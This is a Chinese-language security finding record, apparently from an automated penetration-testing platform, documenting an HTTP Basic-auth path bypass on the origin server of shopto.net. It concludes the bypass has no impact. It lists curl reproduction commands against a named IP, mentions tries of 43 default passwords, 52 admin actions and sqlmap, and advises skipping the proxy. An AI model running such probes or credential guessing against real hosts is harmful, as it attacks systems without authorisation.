# shopto.net 源站 DcCMS 后台面板 Basic 门禁路径绕过——可利用性为无（阴性情报）

- **code**: shopto-origin-basic-path-bypass-dccms-panel-no-impact
- **kind**: poc
- **category**: auth-bypass
- **component**: DcCMS 2015 / dcshop (dynamic commerce GmbH) shopto.net 源站 3.8.196.174 多 vhost
- **source**: self
- **verified**: 1
- **verified_note**: 2026-11-11 15:59-16:10 UTC，ARTEX 执行机 Windows/Git Bash + curl 实测：① 复现绕过：Host cp.shopto.net GET / → 401，/dc/ → 200/2367B(DcCMS Login)；② www.shopto.net/dc/ → 200/2367B，与源站版归一化后 diff 完全一致 → 无增量；③ 43 组口令 + 52 个 action + sqlmap 全落空（见 task#4 finding#86 报告与事实节点 #1326/#1327/#1328）。
- **created_at**: 2026-11-11T16:15:21.520Z
- **engine**: https://3.8.196.174 (cp/production/old/web3.shopto.net)

## 描述

适用条件：*.shopto.net 源站(3.8.196.174)的 HTTP Basic 门禁只挂 /，/dc/ 等路径可匿名直达。判据：Host: cp.shopto.net GET / → 401，GET /dc/ → 200 DcCMS 登录页。结论=绕过成立但无增量，原因见下，勿再重复投入。

## 用法

```
【判定要点·为什么不可利用】
A) 暴露的 DcCMS 后台 /dc/(form_admin_login?action=admin_login) 与伙伴门户 /pp/ 登不进去：43 组默认/弱口令全 302→/dc/；/dc/?action=(52 值) 全回落登录页(2367B)无未授权 action；sqlmap level3 判 input_login 非动态、无 SQLi；DcCMS 2015 无公开 CVE。
B) 关键：门禁"保护"的内容在生产 www.shopto.net 公网本就开放——curl https://www.shopto.net/dc/ → 200 2367B DcCMS Login，与 curl -H 'Host: cp.shopto.net' https://3.8.196.174/dc/ 归一化后逐字节相同；/pp/ 200、/module/dcshop/b2c/ajax_cart.php 200。故绕过不带来超出公网可见范围的访问/数据。
【复现命令】
curl -sk --noproxy '*' -D - -H 'Host: cp.shopto.net' https://3.8.196.174/            # 401 Basic
curl -sk --noproxy '*' -H 'Host: cp.shopto.net' https://3.8.196.174/dc/              # 200 DcCMS Login (2367B)
【坑】平台记录代理对部分路径返回空/超时 → 必须 --noproxy '*' 直连；服务端有限速，偶发 000。
```
